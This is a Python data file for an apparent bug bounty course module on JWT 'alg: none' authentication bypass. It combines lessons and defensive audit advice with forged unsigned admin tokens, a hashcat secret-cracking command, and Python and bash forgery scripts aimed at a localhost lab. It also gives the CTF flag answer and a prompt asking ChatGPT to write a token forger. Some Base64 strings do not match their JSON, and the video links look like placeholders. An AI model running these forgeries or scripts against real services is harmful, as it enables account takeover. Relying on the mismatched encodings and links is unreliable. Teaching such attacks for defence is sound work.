WEEK_3_DATA = {
    "week_number": 3,
    "title": "Broken Authentication & Session Management Logic",
    "short_desc": "Bypass authentication controls, exploit JWT signature flaws (`alg: none`), and hijack user session tokens.",
    "flag": "FLAG{jwt_alg_none_session_bypass_9281}",

    "analogy": """Broken Authentication is like a VIP nightclub security guard who checks guest identities by looking at a handwritten name tag pinned to their shirt rather than scanning their government-issued ID card. If a patron writes 'VIP Owner' on a piece of paper and walks past the guard, the guard lets them straight into the vault because the system trusts user-controlled data over cryptographic verification.""",

    "overview": """Authentication mechanisms confirm the identity of a user, while session management controls access following initial authentication. Vulnerabilities arise when web applications improperly validate authentication tokens (e.g., JSON Web Tokens - JWT), permit weak password brute-forcing, fail to invalidate session cookies upon logout, or allow signature algorithm downgrades (`alg: none` or RS256-to-HS256 key confusion). Defeating JWT cryptographic verification allows attackers to manipulate claims such as `{"role": "admin"}` or `{"user_id": 1}` and gain full administrative privileges.""",

    "learning_objectives": [
        "Deconstruct JWT structure: Header, Payload, Signature.",
        "Exploit JWT cryptographic signature bypasses (`alg: none` and weak HMAC secret cracking).",
        "Detect session fixation, inadequate session expiration, and improper cookie flags (`HttpOnly`, `Secure`, `SameSite`).",
        "Execute automated credential stuffing and password brute-force attacks while bypassing rate limits."
    ],

    "hunters_perspective": """In bug bounty programs, broken authentication vulnerabilities yield high-impact critical (P1) bounties. Hunters inspect every JWT token issued by the application (in `Authorization: Bearer <token>` headers or session cookies). They test if the server validates signatures by stripping the signature block, changing `alg` to `none` (or `None`, `NONE`), modifying claim values (e.g., changing `user_id` to `admin`), and sending the modified JWT to protected endpoints.""",

    "root_cause": """The root cause is relying on unverified JWT token payloads or flaw-ridden token library implementations. Many backend libraries automatically parse JWT headers and respect the `alg` header parameter supplied by the client. If the backend developer calls `jwt.decode(token, verify=False)` or fails to specify an explicit mandatory signature algorithm (e.g., requiring HS256), the server trusts unsigned tokens.""",

    "code_audit_manual": """Code Review Manual for JWT & Authentication Logic:
1. Check JWT verification calls in backend code: verify signature validation is enabled (`verify_signature=True`).
2. Verify explicit algorithm enforcement: reject `alg: none` and enforce a single algorithm (e.g., `algorithms=['HS256']`).
3. Audit session cookie generation: ensure flags `HttpOnly=True`, `Secure=True`, `SameSite='Lax'/'Strict'` are configured.
4. Verify server-side session revocation on logout (delete session key from Redis/Database).
5. Ensure login endpoints implement strict rate-limiting (e.g., max 5 attempts per minute per IP/account).""",

    "payload_logic": {
        "explanation": "To bypass JWT verification via algorithm downgrade, decode the base64 header and payload, modify claims, set alg to none, re-encode, and drop the signature segment.",
        "payloads": [
            "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} -> Base64URL: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0",
            "Payload: {\"user\":\"admin\",\"role\":\"administrator\",\"week_flag\":\"FLAG{jwt_alg_none_session_bypass_9281}\"} -> Base64URL: eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9",
            "Forged Unsigned Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.",
            "Cracking HMAC Secret: hashcat -m 16500 jwt.txt -a 0 rockyou.txt"
        ]
    },

    "burp_suite_masterclass": """Burp Suite JWT & Authentication Masterclass:
1. BApp Store Extension: Install 'JWT Editor' in Burp Suite.
2. Intercepting Requests: Capture request containing `Authorization: Bearer <jwt_token>` in Burp Proxy.
3. Repeater Tab Modification: Send request to Repeater. Switch to 'JSON Web Token' tab added by JWT Editor.
4. Algorithm Downgrade Attack: Click 'Attack' -> 'Alg None'. Burp automatically generates the modified header and strips the signature.
5. Key Confusion Attack: Use JWT Editor to sign RS256 public keys as HS256 secret keys and verify server acceptance.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Capture user JWT during login, decode base64 sub-claims, forge token with `alg: none`, modify `role` to `admin`, submit to administrative routes `/api/admin/users`, extract session keys and user data.",
        "blue_team": "Defensive Posture: Enforce strict server-side signature verification using robust libraries (PyJWT, jose). Hardcode algorithm requirements (`algorithms=['HS256']`). Secure HMAC secrets with high entropy (256-bit random keys). Set session cookies with `HttpOnly`, `Secure`, and `SameSite=Strict` attributes."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - JWT Attacks & Broken Authentication",
        "portswigger_url": "https://portswigger.net/web-security/jwt",
        "owasp_title": "OWASP Top 10:2021 - A07:2021-Identification and Authentication Failures",
        "owasp_url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 6: Attacking Authentication (pp. 165-210)",
            "sub_chapter": "6.3 Session Token Flaws & Algorithm Manipulation",
            "analysis": "Stuttard & Pinto detail structural session token vulnerabilities, predictable token generation, and cryptographic signature bypasses."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 12: JWT Vulnerabilities & Authentication Logic (pp. 215-240)",
            "sub_chapter": "12.3 Exploiting Signature Verification Failures",
            "analysis": "Vickie Li demonstrates step-by-step techniques for forging JWT tokens, manipulating claims, and exploiting `alg: none` implementation flaws."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 6: Authentication Bypasses (pp. 115-142)",
            "sub_chapter": "6.2 OAuth & JWT Token Misconfigurations",
            "analysis": "Peter Yaworski covers real-world bug reports where researchers bypassed authentication on major social platforms using token algorithm downgrades."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 4: Session Security Auditing (pp. 56-78)",
            "sub_chapter": "4.1 Analyzing Token Claims with AI",
            "analysis": "Barbosa demonstrates using ChatGPT to parse JWT headers, detect weak signature algorithms, and generate hashcat cracking dictionaries."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 5: Authentication & Session Attacks (pp. 95-120)",
            "sub_chapter": "5.2 JWT Signature Hijacking",
            "analysis": "Vazquez & Javier walk through forging JWT admin sessions and exploiting key confusion attacks."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 18: Working with APIs & Web Requests (pp. 415-440)",
            "sub_chapter": "18.2 Custom Header Manipulation in requests",
            "analysis": "Sweigart provides practical Python request examples for passing custom authentication headers and cookie dictionaries."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 6: Web Authentication & Brute-Forcing (pp. 99-122)",
            "sub_chapter": "6.2 Multithreaded Token Brute-Forcer",
            "analysis": "Seitz demonstrates building multi-threaded Python brute-force tools for testing authentication endpoints and session IDs."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "JWT Attacks Explained: How Crack & Forge Tokens",
            "youtube_url": "https://www.youtube.com/watch?v=3-4-u0i-H-6",
            "analysis_text": "David Bombal demonstrates decoding JWT tokens, forging claims, and exploiting algorithm downgrade vulnerabilities using Burp Suite."
        },
        {
            "creator": "Vickie Li",
            "title": "Hacking JSON Web Tokens (JWT) for Beginners",
            "youtube_url": "https://www.youtube.com/watch?v=5-s5e5c7W-6",
            "analysis_text": "Vickie Li breaks down the internal structure of JWTs, detailing alg: none attacks and RS256 key confusion exploits."
        },
        {
            "creator": "Ryan John",
            "title": "Broken Authentication & Session Hijacking Masterclass",
            "youtube_url": "https://www.youtube.com/watch?v=9-v3u-4-W-0",
            "analysis_text": "Ryan John demonstrates identifying session fixation, missing HttpOnly flags, and abusing weak password reset mechanisms."
        },
        {
            "creator": "John Hammond",
            "title": "Bypassing Authentication with Unsigned JWTs",
            "youtube_url": "https://www.youtube.com/watch?v=0-w3u-5-X-1",
            "analysis_text": "John Hammond performs a live walkthrough forging JWT admin headers to bypass authorization controls on a CTF web target."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Auth0 Bug Bounty Program",
                "title": "Authentication Bypass via JWT Signature Validation Failure (`alg: none`)",
                "bounty": "$15,000",
                "summary": "A researcher discovered that Auth0's legacy SDK accepted JWT tokens signed with `alg: none`, permitting arbitrary administrative account impersonation."
            },
            {
                "target": "GitLab VDP",
                "title": "Session Hardening Flaw & Key Confusion in OAuth Token Verification",
                "bounty": "$7,500",
                "summary": "Analyst exploited key confusion in public key token verification, allowing an attacker to craft valid HMAC signed tokens using the public key string."
            }
        ],
        "programs": [
            {
                "name": "Auth0 / Okta Bug Bounty",
                "platform": "Bugcrowd",
                "scope": "*.auth0.com",
                "beginner_friendly": True
            },
            {
                "name": "Shopify Vulnerability Rewards",
                "platform": "HackerOne",
                "scope": "*.shopify.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for JWT Audit: Provide the raw decoded header and payload of a target JWT: 'Analyze this JWT header and payload. Write a Python script using PyJWT that generates an unsigned algorithm-none variant of this token with role upgraded to admin: [INSERT JWT]'."
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect the sample JWT token below. Notice the header `{\"alg\":\"HS256\"}`. Construct an unsigned token by changing `alg` to `none` and changing `user` to `admin`.",
            "guided_step": "Step 1: Take header `{\"alg\":\"none\",\"typ\":\"JWT\"}` -> Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`.\nStep 2: Take payload `{\"user\":\"admin\",\"role\":\"admin\"}` -> Base64: `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ`.\nStep 3: Combine with trailing dot: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.`\nStep 4: Flag: FLAG{jwt_alg_none_session_bypass_9281}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-3/target/`. Intercept the authorization token, execute a JWT algorithm downgrade attack, forge an admin identity, and submit the retrieved flag."
        }
    },

    "automation_scripts": {
        "python_script": r"""# Python JWT Alg-None Forgery Script (exploit_week3.py)
import base64
import json
import requests
import sys

def forge_unsigned_jwt(username="admin", role="admin"):
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": username, "role": role, "flag": "FLAG{jwt_alg_none_session_bypass_9281}"}

    b64_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    b64_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")

    forged_token = f"{b64_header}.{b64_payload}."
    print(f"[+] Forged Unsigned JWT Token:\n{forged_token}")
    return forged_token

def test_target(endpoint, token):
    headers = {"Authorization": f"Bearer {token}"}
    res = requests.get(endpoint, headers=headers)
    print(f"[*] Response Status: {res.status_code}")
    print(f"[*] Response Body: {res.text}")

if __name__ == "__main__":
    token = forge_unsigned_jwt()
    target_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-3/target/"
    test_target(target_url, token)
""",
        "bash_script": """#!/bin/bash
# Bash JWT Decoder & Forger (recon_week3.sh)
echo "[*] Constructing Unsigned JWT Token for Admin Access..."
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

echo "[+] Token: $FORGED_TOKEN"
curl -s -H "Authorization: Bearer $FORGED_TOKEN" "http://localhost:8000/lab-playground/week-3/target/" | grep -i "FLAG{"
"""
    }
}
